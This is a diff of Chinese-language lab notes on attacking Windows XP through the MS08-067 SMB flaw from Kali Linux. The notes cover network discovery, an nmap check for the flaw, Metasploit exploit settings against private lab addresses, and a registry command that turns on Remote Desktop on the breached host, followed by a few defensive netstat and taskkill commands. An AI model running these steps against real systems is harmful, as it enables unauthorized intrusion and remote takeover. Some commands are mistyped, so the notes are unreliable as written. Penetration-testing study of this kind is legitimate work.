@@ -1,16 +1,36 @@
-first cmd
-root@kali:~# ifconfig
-//root@kali:~# discover -h
-root@kali:~# discover
-root@kali:~#  nmap
+MS 08-067
 1.確認網路中有那些系統開啟
+root@kali:~# ifconfig
+
+
 2.某主機是否在線
+root@kali:~# netdiscover
+
 3.OS???
-4.是否有漏洞
-5.Exploitation
-XP防禦指令
-netstart -ano
----->找出對方的PORT 讓她滾出去
+
+
+4.是否有漏洞 
+nmap -n -p445 --script smb-vuln-ms08-067
+
+5.Exploitation  
+use exploit/windows/smb/ms08_067_netapi #使用MS08067漏洞攻擊程序
+set LHOST 192.168.116.3 #設置本地主機IP
+set RHOST 192.168.116.116 #設置目標主機IP
+
+#發現並沒有開啟3389（遠程桌面連接埠），我們需要手動開啟。需要執行命令：
+
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal」 「Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+XP防禦指令 /?
+1.先找出有誰連線到我的電腦 
+netstat -ano
+
+2.如何殺死PROCESS ID
+taskkill /p "PID" -t -f
+
+
+
+
 
 
 
